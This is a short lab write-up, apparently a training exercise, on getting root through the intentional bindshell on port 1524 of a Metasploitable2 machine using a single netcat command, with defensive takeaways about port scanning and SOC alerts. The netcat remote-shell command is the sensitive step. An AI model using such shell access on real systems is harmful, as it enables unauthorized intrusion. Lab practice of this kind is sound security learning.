# Metasploitable Bindshell — Port 1524

**Date:** 2026-07-25
**Status:** Complete

## Objective
Access the open root bindshell on Metasploitable2 via port 1524.

## Environment
- Attacker: Kali Linux (192.168.56.102)
- Target: Metasploitable2 (192.168.56.101)

## Tools Used
- nc (netcat)

## What is a Bindshell?
A bindshell is a backdoor that binds a shell (command prompt) to a specific port 
and listens for incoming connections. Anyone who connects to that port gets 
immediate shell access. In this particualar case, root access is granted.

## Steps Taken
1. Connected to port 1524 using netcat:
```bash
   nc 192.168.56.101 1524
```
2. Instantly received a root shell — no credentials required.
3. Verified access:
```bash
   whoami   # root
   id       # uid=0(root) gid=0(root) groups=0(root)
   hostname # metasploitable
```

## Findings
- Port 1524 on Metasploitable2 runs an intentional root bindshell
- No authentication required — any connection gets immediate root access
- This represents a worst-case scenario in real environments

## Takeaways
- Open bindshells are catastrophic in real environments — full system compromise 
  with a single command
- Port scanning (nmap) is essential for discovering exposed services like this
- In a SOC context, an unexpected open port like 1524 should trigger immediate 
  investigation
